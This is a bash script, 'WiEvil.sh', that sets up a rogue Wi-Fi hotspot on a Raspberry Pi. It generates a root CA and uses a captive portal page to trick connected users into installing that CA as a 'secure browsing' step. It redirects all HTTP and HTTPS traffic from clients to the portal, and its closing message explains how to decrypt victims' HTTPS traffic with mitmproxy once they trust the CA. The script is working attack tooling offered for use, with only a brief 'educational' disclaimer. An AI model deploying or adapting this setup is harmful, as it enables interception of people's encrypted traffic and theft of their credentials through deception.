#!/usr/bin/env bash
#
#WiEvil.sh - A "malicious hotspot" + Root CA + captive portal + HTTPS redirect
# for Raspberry Pi OS (Debian Bookworm), using systemd-networkd, hostapd, dnsmasq,
# Apache for serving the cert, and iptables for port redirection.
#
# USAGE: sudo ./WiEvil.sh
#
# DISCLAIMER: For educational / authorized use only. This script can create
# a rogue AP and root CA to facilitate MITM attacks, which is illegal otherwise.

set -euo pipefail

# ------------- Helper Functions -------------
function print_info() {
  echo -e "\n[INFO] $1\n"
}

function check_root() {
  if [ "$(id -u)" -ne 0 ]; then
    echo "[ERROR] Must run as root (sudo). Exiting."
    exit 1
  fi
}

function prompt() {
  local var="$1"
  local message="$2"
  local default_val="${3:-}"

  if [ -n "$default_val" ]; then
    read -r -p "$message [$default_val]: " user_val
    if [ -z "$user_val" ]; then
      eval "$var=\"$default_val\""
    else
      eval "$var=\"$user_val\""
    fi
  else
    read -r -p "$message: " user_val
    eval "$var=\"$user_val\""
  fi
}

check_root

print_info "Welcome to the Root CA + Malicious Hotspot Wizard!
This script will:
1) Stop dhcpcd if found (it conflicts).
2) Verify Pi has internet on eth0 (NetworkManager).
3) Generate a Root CA w/ OpenSSL.
4) Install Apache to serve that CA + a captive portal page.
5) Configure systemd-networkd, hostapd, dnsmasq for 'wlan0' => '192.168.50.1'
6) Redirect ports 80/443 to the local portal, so user sees instructions to install the CA.
7) (Optional) NAT from wlan0 -> eth0 so connected devices have internet.
Proceed only on a fresh Pi OS (Debian Bookworm)."

# ----- Step 1: Check OS (optional) -----
if grep -q "bookworm" /etc/os-release; then
  print_info "OS: Debian Bookworm confirmed."
else
  echo "[WARNING] OS is not Bookworm. Continuing anyway..."
fi

# ----- Step 2: Stop dhcpcd if installed -----
DHCP_SERVICE="dhcpcd.service"
dhcpcd_path="$(command -v dhcpcd || true)"
if [ -n "$dhcpcd_path" ] || systemctl status "$DHCP_SERVICE" &>/dev/null; then
  print_info "dhcpcd is installed or running, which can conflict."
  read -r -p "Stop & disable dhcpcd now? (y/N): " ans
  if [[ "$ans" =~ ^[Yy]$ ]]; then
    systemctl stop dhcpcd.service || true
    systemctl disable dhcpcd.service || true
    echo "[INFO] dhcpcd stopped & disabled."
  else
    echo "[WARNING] dhcpcd may cause conflicts."
  fi
fi

# ----- Step 3: Check internet on eth0 -----
print_info "Checking if Pi can reach internet via eth0..."
if ping -c 1 8.8.8.8 &>/dev/null; then
  print_info "Pi has internet. Good."
else
  echo "[WARNING] Pi can't ping 8.8.8.8. NAT won't help if no net."
  read -r -p "Continue anyway? (y/N): " cont
  if [[ ! "$cont" =~ ^[Yy]$ ]]; then
    echo "[INFO] Exiting."
    exit 0
  fi
fi

# ----- Prompt user for AP, root CA details -----
prompt AP_SSID "Enter AP SSID" "MaliciousAP"
prompt AP_CHANNEL "Enter Wi-Fi channel (1,6,11,...)" "6"
prompt AP_COUNTRY "Enter 2-letter country code" "US"
prompt AP_PSK "Enter WPA2 passphrase (>=8 chars)" "TestPass123"
prompt CA_NAME "Enter a name for the Root CA" "EvilRootCA"

print_info "Using:
  SSID: $AP_SSID
  Channel: $AP_CHANNEL
  Country: $AP_COUNTRY
  Passphrase: $AP_PSK
  Root CA Name: $CA_NAME
"

# ----- Step 4: Install packages -----
print_info "Installing hostapd, dnsmasq, iptables, apache2, openssl..."
apt-get update
apt-get install -y hostapd dnsmasq iptables apache2 openssl

# Unmask hostapd
print_info "Unmasking & enabling hostapd..."
systemctl unmask hostapd || true
systemctl enable hostapd

# ----- Step 5: Generate Root CA -----
print_info "Generating a self-signed Root CA: /etc/evilca/$CA_NAME.(key|crt)..."
mkdir -p /etc/evilca
cd /etc/evilca
openssl req -x509 -newkey rsa:2048 -keyout "$CA_NAME.key" -out "$CA_NAME.crt" -days 365 -nodes \
  -subj "/CN=$CA_NAME" 
chmod 600 "$CA_NAME.key"
cd ~

# We'll copy CA to apache's docroot so user can download
cp /etc/evilca/"$CA_NAME.crt" /var/www/html/ca.crt

# ----- Step 6: Minimal captive page instructing user to install CA -----
print_info "Creating captive portal page in /var/www/html/index.html..."
cat <<EOF > /var/www/html/index.html
<!DOCTYPE html>
<html>
<head>
  <title>Malicious Hotspot - CA Install</title>
</head>
<body>
  <h1>Welcome to $AP_SSID</h1>
  <p>To ensure a 'secure' browsing experience, please install our <strong>Root CA</strong>:</p>
  <p><a href="ca.crt" download>Download Root CA</a></p>
  <p>Once installed, your device will trust all certificates signed by it.</p>
  <hr/>
  <p><em>Disclaimer: This is a malicious example for demonstration only.</em></p>
</body>
</html>
EOF

# Ensure apache2 is running
systemctl enable apache2
systemctl restart apache2

# ----- Step 7: Unmanage wlan0 in NetworkManager -----
print_info "Configuring NetworkManager to ignore wlan0..."
mkdir -p /etc/NetworkManager/conf.d
cat <<EOF > /etc/NetworkManager/conf.d/10-unmanage-wlan0.conf
[keyfile]
unmanaged-devices=interface-name:wlan0
EOF
systemctl restart NetworkManager
nmcli dev status || true

# ----- Step 8: systemd-networkd for wlan0 => 192.168.50.1 -----
print_info "Setting wlan0 => 192.168.50.1 via systemd-networkd..."
mkdir -p /etc/systemd/network
cat <<EOF > /etc/systemd/network/30-wlan0.network
[Match]
Name=wlan0

[Network]
Address=192.168.50.1/24
EOF

systemctl enable systemd-networkd
systemctl restart systemd-networkd
ip link set wlan0 up || true
sleep 2

# ----- Step 9: hostapd config -----
print_info "Creating /etc/hostapd/hostapd.conf..."
cat <<EOF > /etc/hostapd/hostapd.conf
interface=wlan0
driver=nl80211
ssid=$AP_SSID
hw_mode=g
channel=$AP_CHANNEL
country_code=$AP_COUNTRY

wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=$AP_PSK
rsn_pairwise=CCMP
EOF

if grep -q "^DAEMON_CONF=" /etc/default/hostapd; then
  sed -i 's|^DAEMON_CONF=.*|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd
else
  echo 'DAEMON_CONF="/etc/hostapd/hostapd.conf"' >> /etc/default/hostapd
fi

systemctl stop hostapd || true
systemctl start hostapd
sleep 2
systemctl status hostapd --no-pager || true

# ----- Step 10: dnsmasq for DHCP on wlan0 -----
print_info "Configuring dnsmasq for DHCP..."
if [ -f /etc/dnsmasq.conf ]; then
  mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig.$(date +%s)
fi

cat <<EOF > /etc/dnsmasq.conf
interface=wlan0
dhcp-range=192.168.50.50,192.168.50.100,12h
dhcp-option=3,192.168.50.1
dhcp-option=6,192.168.50.1
EOF

systemctl enable dnsmasq
systemctl restart dnsmasq
systemctl status dnsmasq --no-pager || true

# ----- Step 11: iptables to redirect HTTP/HTTPS to local portal -----
print_info "Redirecting ports 80 & 443 to local Apache, so users see the captive page..."

# 1) Let ip_forward be enabled, even if you do NAT later
sed -i 's|^#net.ipv4.ip_forward=1|net.ipv4.ip_forward=1|' /etc/sysctl.conf
sysctl -p || true

# 2) Flush old rules
iptables -F
iptables -t nat -F

# 3) Basic forward rule: allow
iptables -P FORWARD ACCEPT

# 4) Redirect inbound HTTP (80) from wlan0 to 80 on 192.168.50.1
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.50.1:80

# 5) Redirect inbound HTTPS (443) from wlan0 to 80 as well
#    (So user sees captive page even for HTTPS)
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to-destination 192.168.50.1:80

# Save
mkdir -p /etc/iptables
iptables-save > /etc/iptables/iptables-rules.v4

# Insert into /etc/rc.local
if [ ! -f /etc/rc.local ]; then
  echo "#!/bin/sh -e" > /etc/rc.local
  echo "exit 0" >> /etc/rc.local
  chmod +x /etc/rc.local
fi

if ! grep -q "iptables-restore < /etc/iptables/iptables-rules.v4" /etc/rc.local; then
  sed -i '/^exit 0/i iptables-restore < /etc/iptables/iptables-rules.v4' /etc/rc.local
fi

# ----- Step 12: (Optional) NAT from wlan0->eth0 for real internet -----
read -r -p "Also enable NAT so clients can reach the internet? (y/N): " do_nat
if [[ "$do_nat" =~ ^[Yy]$ ]]; then
  print_info "Adding MASQUERADE rule for NAT..."
  iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
  iptables-save > /etc/iptables/iptables-rules.v4
  print_info "Clients can get real internet AFTER they remove/avoid captive redirection or if you remove the port 443->80 rule"
else
  print_info "No NAT. Clients see only the local page unless you remove or modify the redirect rules."
fi

# ----- Step 13: Final checks -----
print_info "All done! 
1) We generated a Root CA in /etc/evilca.
2) The CA is served at http://192.168.50.1/ca.crt (and also on the captive portal).
3) 'hostapd' + 'dnsmasq' create a rogue AP on 'wlan0' => '192.168.50.1'.
4) iptables redirects all HTTP/HTTPS from connected clients to the captive portal (Apache).
   They see 'index.html' instructing them to install 'ca.crt'.

If you want full HTTPS interception:
 - Have users install the CA on their device.
 - Then run a MITM tool (e.g., 'mitmproxy') on a custom port 
 - Adjust iptables to redirect 443 -> that port 
 - Once they trust the CA, you can decrypt all HTTPS.

Reboot recommended: sudo reboot
Enjoy your malicious hotspot + Root CA (education only)!"
exit 0
